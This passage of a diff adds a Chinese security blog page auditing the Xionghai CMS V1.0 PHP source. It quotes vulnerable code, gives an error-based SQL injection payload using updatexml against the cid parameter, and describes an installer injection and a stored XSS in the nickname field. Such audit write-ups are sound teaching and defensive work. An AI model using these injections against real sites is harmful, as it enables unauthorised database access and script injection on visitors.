+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;修改错误：&#39;</span><span class="o">.</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$query = &quot;UPDATE content SET hit = hit+1 WHERE id=$id&quot;;</code>没有用<code>'</code>进行闭合,可以进行报错注入</p>
+<p><code>?r=content&amp;cid=1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1);</code></p>
+<h2 id="filessoftwarephp存在sql注入">files/software.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;inc/conn.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;inc/time.class.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM settings&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$info</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM download WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$resul</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;SQL语句有误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$download</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//浏览计数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;UPDATE download SET hit = hit+1 WHERE id=</span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;修改错误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同上</p>
+<h2 id="installindexphp存在sql注入">install/index.php存在SQL注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ob_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type:text/html;charset=utf-8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s1">&#39;InstallLock.txt&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;你已经成功安装熊海内容管理系统，如果需要重新安装请删除install目录下的InstallLock.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$save</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dbhost</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dbhost&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dbuser</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dbuser&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dbpwd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dbpwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dbname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$save</span> <span class="o">&lt;&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">include</span> <span class="s1">&#39;../inc/db.class.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DBManage</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpwd</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$db</span><span class="o">-&gt;</span><span class="na">restore</span><span class="p">(</span><span class="s1">&#39;seacms.sql&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="se">\$</span><span class="s2">DB_HOST=&#39;&#34;</span> <span class="o">.</span> <span class="nv">$dbhost</span> <span class="o">.</span> <span class="s2">&#34;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="se">\$</span><span class="s2">DB_USER=&#39;&#34;</span> <span class="o">.</span> <span class="nv">$dbuser</span> <span class="o">.</span> <span class="s2">&#34;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="se">\$</span><span class="s2">DB_PWD=&#39;&#34;</span> <span class="o">.</span> <span class="nv">$dbpwd</span> <span class="o">.</span> <span class="s2">&#34;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="se">\$</span><span class="s2">DB_NAME=&#39;&#34;</span> <span class="o">.</span> <span class="nv">$dbname</span> <span class="o">.</span> <span class="s2">&#34;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$of</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;../inc/conn.info.php&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$of</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$of</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;MySQL数据库连接配置成功!&lt;br /&gt;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$conn</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysql_connect</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpwd</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;数据库连接失败，错误信息：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">mysql_select_db</span><span class="p">(</span><span class="nv">$dbname</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;数据库错误，错误信息：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">mysql_query</span><span class="p">(</span><span class="s1">&#39;SET NAMES UTF8&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;字符集设置错误&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;UPDATE manage SET user=&#39;</span><span class="si">$user</span><span class="s2">&#39;,password=&#39;</span><span class="si">$password</span><span class="s2">&#39;,name=&#39;</span><span class="si">$user</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">@</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;修改错误：&#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;管理信息已经成功写入!&lt;br /&gt;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;熊海内容管理系统 V1.0</span><span class="se">\r\n\r\n</span><span class="s2">安装时间：&#34;</span> <span class="o">.</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$of</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;InstallLock.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$of</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$of</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fclose</span><span class="p">(</span><span class="nv">$of</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;为防止重复安装，安装锁已经生成!&lt;br /&gt;&lt;br /&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;&lt;font color=&#39;#006600&#39;&gt;恭喜,熊海网站管理系统已经成功安装！&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ob_end_flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$query = &quot;UPDATE manage SET user='$user',password='$password',name='$user'&quot;;</code>单引号注入,但是由于安装完成后会生成<code>InstallLock.txt</code>防止重复安装,需要去除这个文件才能够利用这一注入点</p>
+<h2 id="filessubmitphp存在存储型xss">files/submit.php存在存储型XSS</h2>
+<p><code>$content = addslashes(strip_tags($content)); //过滤HTML</code>只对内容进行了过滤,而没有对昵称进行过滤,在昵称处插入XSS即可</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-11</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/vulnhub-hacksudo/" class="prev" rel="prev" title="VulnHub-hacksudo"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>VulnHub-hacksudo</a>
+            <a href="/bluecms/" class="next" rel="next" title="BlueCMS">BlueCMS<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
